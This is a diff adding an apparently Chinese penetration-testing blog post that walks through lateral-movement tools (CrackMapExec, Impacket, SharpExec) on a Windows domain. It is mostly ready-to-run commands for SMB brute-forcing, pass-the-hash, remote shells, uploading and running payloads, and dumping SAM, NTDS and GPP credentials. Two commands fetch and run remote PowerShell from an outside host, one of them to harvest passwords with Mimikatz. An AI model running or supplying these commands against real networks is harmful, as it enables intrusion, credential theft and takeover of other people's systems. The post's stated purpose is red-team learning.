@@ -152,6 +152,327 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网横向移动套件的利用总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-26 17:15:32" itemprop="dateCreated datePublished" datetime="2020-08-26T17:15:32+08:00">2020-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:04:41" itemprop="dateModified" datetime="2020-09-02T20:04:41+08:00">2020-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通过上篇文章我们了解了关于内网横向移动的常用方法，但是实战中去使用这些方法往往效率比较低，并且已经有很多大佬发现了这一点并且针对于每种横向移动的方法写出了横向移动的套件。熟悉这些横向移动套件的使用有助于提高我们渗透的速度。因此学习大佬们横向移动套件的使用是非常有必要的，下面我将和大家一起学习关于内网横向移动套件的使用。</p>
+<h3 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a>Crackmapexec</h3><p>​        Crackmapexec是一款由python开发的横向移动利用工具，网上也有人打包好了它的<a href="https://github.com/maaaaz/CrackMapExecWin" target="_blank" rel="noopener">windows版本</a>，这个是2.x版本的打包,虽然版本比较旧，但是基本的功能都有了</p>
+<p>​        在横向移动之前，可以去扫描开放445端口的主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105034304.png" alt="image-20200827105034304"></p>
+<p><strong>查看主机的共享</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe host.txt -t 1 -u administrator -p Admin123456 --share</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827105808677.png" alt="image-20200827105808677"></p>
+<p><strong>查看当前主机的用户</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111211507.png" alt="image-20200827111211507"></p>
+<p><strong>主机都有什么盘</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt --disk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827111346074.png" alt="image-20200827111346074"></p>
+<p><strong>批量smb爆破</strong></p>
+<p>​        首先我们先扫描那些主机开放了445端口，再将开放445的ip保存到一个txt中，使用下面的命令进行爆破。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826193844481.png" alt="image-20200826193844481"></p>
+<p><strong>爬取用户目录下包含某个关键字的文件名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxx -t 1 host.txt  --spider Users --depth 10 --pattern username</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827120109187.png" alt="image-20200827120109187"></p>
+<p><strong>批量hash传递</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxxx -t 10 host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194130572.png" alt="image-20200826194130572"></p>
+<p><strong>批量文件操作</strong></p>
+<p>​        批量上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p Admin123456 -t 1 host.txt  --upload C:\Users\xxx\Desktop\SharpMove.exe  \\Windows\\Temp\\whoami.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134605698.png" alt="image-20200827134605698"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134523163.png" alt="image-20200827134523163"></p>
+<p>​        批量查看文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt  --list \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827134847632.png" alt="image-20200827134847632"></p>
+<p>​        下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 192.168.3.144  --download \\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827135107554.png" alt="image-20200827135107554"></p>
+<p><strong>批量执行命令</strong></p>
+<p>​        通过smbexec批量执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194639115.png" alt="image-20200826194639115"></p>
+<p>​        通过smbexec远程加载powershell上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxxx:8011&#x2F;a111&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114124144.png" alt="image-20200827114124144"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827114139359.png" alt="image-20200827114139359"></p>
+<p>​        通过wmi批量执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxxx -t 1 host.txt --execm wmi -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826194904286.png" alt="image-20200826194904286"></p>
+<p>​        通过atexec批量hash传递执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xxx -t 1 192.168.3.11 --execm atexec -x &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202039799.png" alt="image-20200826202039799"></p>
+<p><strong>批量抓密码</strong></p>
+<p>​        使用wmi加载远程powershell脚本批量抓密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxx:xx -t 1 host.txt --execm wmi -X &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;111.229.70.13:801&#x2F;Invoke-Mimidogz.ps1&#39;);Invoke-Mimidogz&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826202829550.png" alt="image-20200826202829550"></p>
+<p>​        调用Invoke-Mimikatz.ps1批量抓密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H aad3b435b51404eeaad3b435b51404ee:ae4c0d5fb959fda8f4cb1d14a8376af4 -t 1 host.txt --mimikatz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093343519.png" alt="image-20200827093343519"></p>
+<p><strong>批量dump hash</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -H xxxx:xxxx -t 1 --sam  host.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200826203436519.png" alt="image-20200826203436519"></p>
+<p><strong>远程导出域控中所有的hash</strong></p>
+<p>​        这个过程比较慢，不建议在实际中使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 192.168.3.144 --ntds vss</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827093924405.png" alt="image-20200827093924405"></p>
+<p><strong>搜集GPP密码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe -d . -u administrator -p xxxx -t 1 host.txt --gpp-passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827094518023.png" alt="image-20200827094518023"></p>
+<p>​        其他的利用方法可以参考<a href="https://mpgn.gitbook.io/crackmapexec/" target="_blank" rel="noopener">官方文档</a></p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>​        Impacket是用于处理网络协议的Python类的集合。我们除了可以使用python版本，也可以使用别人打包好的<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">windows版本</a>进行利用。这个打包的稍微旧了一点，不过大部分的功能已经打包好了，还有比较<a href="https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries" target="_blank" rel="noopener">新的打包版本</a>,下面我介绍下它在横向渗透中常用的功能。</p>
+<p><strong>atexec</strong></p>
+<p>​        通过计划任务执行命令,默认以<strong>system权限</strong>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827161851281.png" alt="image-20200827161851281"></p>
+<p>​        也可以使用PTH的方式执行、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827162051117.png" alt="image-20200827162051117"></p>
+<p><strong>DCOM</strong></p>
+<p>​        使用这种方式，默认以<strong>administrator权限</strong>执行命令，也可以获取交互shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827170845398.png" alt="image-20200827170845398"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181250651.png" alt="image-20200827181250651"></p>
+<p>​        也可以通过hash传递来运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.11 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171222916.png" alt="image-20200827171222916"></p>
+<p><strong>SMB</strong></p>
+<p>​        通过smbexec可以直接获取交互的shell,shell权限也是<strong>system权限</strong>，但无法执行直接执行cmd命令，因此不适合在shell下进行操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171503784.png" alt="image-20200827171503784"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827171909815.png" alt="image-20200827171909815"></p>
+<p><strong>psexec</strong></p>
+<p>​        使用psexec会在目标系统创建服务,返回权限为<strong>system权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxx .&#x2F;administrator@192.168.3.51</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172249787.png" alt="image-20200827172249787"></p>
+<p>​        也可以使用psexec执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827172609121.png" alt="image-20200827172609121"></p>
+<p>​        也可以直接利用psexec上传文件并且执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe .&#x2F;administrator:xxx@192.168.3.144 -c C:\Users\jerry\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173702596.png" alt="image-20200827173702596"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827173725431.png" alt="image-20200827173725431"></p>
+<p>​        这个过程可能会在命令行下出现卡顿，这个不要紧，当我们把弹过来的shell使用完后退出后即可恢复正常，强行关闭命令行会导致创建的服务不能删除。</p>
+<p><strong>WMI</strong></p>
+<p>​        使用wmiexec进行横向移动，既可以获取交互shell也可以执行命令,也可以进行PTH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827174532234.png" alt="image-20200827174532234"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:xxx@192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175007031.png" alt="image-20200827175007031"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :xxxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827175129269.png" alt="image-20200827175129269"></p>
+<p>​        关于impacket常见的横向渗透的方法先介绍这么多，我写个表格对各种横向渗透的方式进行简单的对比</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827181506980.png" alt="image-20200827181506980"></p>
+<h3 id="SharpExec"><a href="#SharpExec" class="headerlink" title="SharpExec"></a>SharpExec</h3><p>​        SharpExec是一个C#编写的集合了WMIExec，SMBExec，PSExec等常见横向渗透方法的工具。由于这个工具不是很有名，所以可能免杀稍微好一点（我猜的）。</p>
+<p><strong>1、psexec</strong></p>
+<p>​        首先生成一个<strong>service类型的shell</strong>，放在本地，使用如下命令将上传本地文件到远程服务器并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;psexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;Admin123456 -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204927302.png" alt="image-20200827204927302"></p>
+<p>​        执行后会返回system权限的shell</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827204958764.png" alt="image-20200827204958764"></p>
+<p>​        当我们执行结束后，将shell退出，再按回车程序会自动将上传的文件删掉。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200827205258375.png" alt="image-20200827205258375"></p>
+<p><strong>2、wmi</strong></p>
+<p>​        这个工具也集成了使用wmi来进行文件上传并且执行的功能,不过这里我们就生成普通的shell即可，不用生成service类型的shell，但生成的shell与系统版本要对应。执行后可以获取administrator权限的shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmi -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;. -f&#x3D;C:\Users\jerry\Desktop\artifact.exe -e&#x3D;c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092336716.png" alt="image-20200828092336716"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828092404709.png" alt="image-20200828092404709"></p>
+<p><strong>3、wmiexec</strong></p>
+<p>​        通过wmiexec可以获取半交互的shell，在shell中除了可以进行常规的命令操作，也可以对文件进行操作。</p>
